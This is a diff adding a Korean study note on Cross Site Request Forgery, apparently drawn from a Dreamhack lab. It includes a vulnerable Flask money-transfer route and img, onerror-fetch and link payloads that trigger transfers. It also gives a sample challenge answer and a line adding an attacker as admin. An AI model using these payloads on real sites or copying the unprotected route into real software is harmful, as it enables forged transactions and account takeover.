@@ -1,0 +1,87 @@
+Cross Site Request Forgery 공격
+
+ex)
+Request
+
+GET /sendmoney?to=dreamhack&amount=1337 HTTP/1.1
+Host: bank.dreamhack.io
+Cookie: session=IeheighaiToo4eenahw3
+
+@app.route('/sendmoney')
+def sendmoney(name):
+	to_user = request.args.get('to')
+	amount = int(request.args.get('amount'))
+	
+	success_status = send_money(to_user, amount)
+	
+	if success_status:
+		return "Send success."
+	else:
+		return "Send fail."
+
+/sendmoney?to=dreamhack&amount=1337을 불러오는 기능은 img src, img href 등 웹사이트가 request를 보낼수 있으면 가능한 코드.
+
+<img src="/sendmoney?to=dreamhack&amount=1337">
+<img src=1 onerror="fetch('/sendmoney?to=dreamhack&amount=1337');">
+<link rel="stylesheet" href="/sendmoney?to=dreamhack&amount=1337"> 등..
+
+아래 코드는 예시 답안 중 하나입니다. 이미지 src 로드가 실패하면 onerror handler를 통해 sendmoney api에 fetch 요청을 보냅니다.
+<img src=1 onerror="fetch('/sendmoney?to=dreamhack&amount=500000');">
+
+이 외에도, 다양한 방법으로 풀이할 수 있습니다.
+<img src="/sendmoney?to=dreamhack&amount=500000">
+<link rel="stylesheet" href="/sendmoney?to=dreamhack&amount=500000">
+
+XSS
+<img src="javascript:XSS code">
+
+CSRF
+<img src="https://dreamhack.io/admin/addadmin?email=attacker@iamattacker.evil">
+
+원리 :
+안녕하세요,
+말씀해주신 것 처럼 해당 URL이 이미지인지 아닌지의 여부는 브라우저가 해당 URL에 요청을 보낸 후 응답 헤더에 존재하는 Content-Type을 확인해 알 수 있습니다.
+즉 브라우저는 해당 URL에 요청을 보내게 됩니다.
+(SameSite가 strict가 아닌 이상 해당 요청에는 쿠키, 세션정보가 함께 전달됩니다.)
+# 보통 페이지를 로딩할떄 src등 url에 요청을 자동으로 보낼때마다 작동
+
+url 이용하는 태그들
+<a href=url>
+<applet codebase=url>
+<area href=url>
+<base href=url>
+<blockquote cite=url>
+<body background=url>
+<del cite=url>
+<form action=url>
+<frame longdesc=url> and <frame src=url>
+<head profile=url>
+<iframe longdesc=url> and <iframe src=url>
+<img longdesc=url> and <img src=url> and <img usemap=url>
+<input src=url> and <input usemap=url>
+<ins cite=url>
+<link href=url>
+<object classid=url> and <object codebase=url> and <object data=url> and <object usemap=url>
+<q cite=url>
+<script src=url>
+HTML 5 adds a few (and HTML5 seems to not use some of the ones above as well):
+
+<audio src=url>
+<button formaction=url>
+<command icon=url>
+<embed src=url>
+<html manifest=url>
+<input formaction=url>
+<source src=url>
+<track src=url>
+<video poster=url> and <video src=url>
+These aren't necessarily simple URLs:
+
+<img srcset="url1 resolution1, url2 resolution2">
+<source srcset="url1 resolution1, url2 resolution2">
+<object archive=url> or <object archive="url1 url2 url3">
+<applet archive=url> or <applet archive=url1,url2,url3>
+<meta http-equiv="refresh" content="seconds; url">
+SVGs can also contain links to resources: <svg><image href="url" /></svg>
+
+In addition, the style attribute can contain css declarations with one or several urls. For example: <div style="background: url(image.png)">
